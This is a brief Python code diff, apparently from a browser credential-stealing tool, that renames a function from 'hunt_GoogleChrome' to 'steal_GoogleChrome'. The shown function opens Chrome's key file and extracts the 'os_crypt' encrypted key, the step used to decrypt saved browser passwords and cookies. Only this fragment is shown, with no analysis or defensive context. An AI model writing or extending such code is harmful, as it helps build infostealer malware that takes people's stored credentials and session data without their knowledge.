@@ -32,7 +32,7 @@ def filetime_to_datetime(ft):
     us = (ft - EPOCH_AS_FILETIME) // 10
     return datetime.datetime(1970, 1, 1) + datetime.timedelta(microseconds = us)
 
-def hunt_GoogleChrome():
+def steal_GoogleChrome():
     with open(chrome_key_path, 'r', encoding='utf-8') as file:
         data = json.load(file)
         encrypted_key = data['os_crypt']['encrypted_key']
